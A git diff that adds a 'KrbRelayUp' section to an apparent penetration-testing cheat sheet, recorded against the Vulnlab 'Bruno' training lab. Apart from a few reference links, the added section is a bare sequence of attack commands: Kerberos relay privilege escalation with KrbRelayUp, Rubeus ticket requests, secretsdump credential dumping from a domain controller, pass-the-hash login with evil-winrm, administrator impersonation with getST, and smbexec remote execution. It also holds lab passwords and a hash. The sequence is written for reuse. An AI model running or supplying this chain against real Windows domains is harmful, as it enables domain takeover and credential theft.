@@ -609,3 +609,40 @@ Another example of this:
 ```
 python3 psexec.py -k DC.support.htb
 ```
+
+
+### KrbRelayUp
+https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/
+
+https://arz101.medium.com/vulnlab-bruno-f0129f60ac40
+
+https://github.com/Dec0ne/KrbRelayUp
+
+https://vulndev.io/cheats-windows/
+
+```
+Did this on Vulnlab Bruno
+
+
+.\KrbRelayUp.exe full -m shadowcred -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 1024
+
+Rubeus.exe asktgt /user:brunodc$ /certificate:MIIKSAIBAzCCCgQGC...snip.... /password:tV0-oN8$aB7- /enctype:AES256 /nowrap
+
+cat temphash | base64 -d > bruno_ticket.kirbi 
+python3 ticketConverter.py bruno_ticket.kirbi bruno_ticket.ccache
+
+
+secretsdump.py 'brunodc$'@brunodc.bruno.vl -k -no-pass
+
+evil-winrm -i $ip -u administrator -H '13735c7d60b417421dc6130ac3e0bfd4'
+
+
+.\KrbRelayUp.exe full -m rbcd -c -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 10246
+
+getST.py -impersonate 'administrator' bruno.vl/'KRBRELAYUP$':'uJ1$j05-iN7/gJ6#' -spn HOST/BRUNODC
+
+smbexec.py administrator@brunodc -k -no-pass
+
+
+```
+
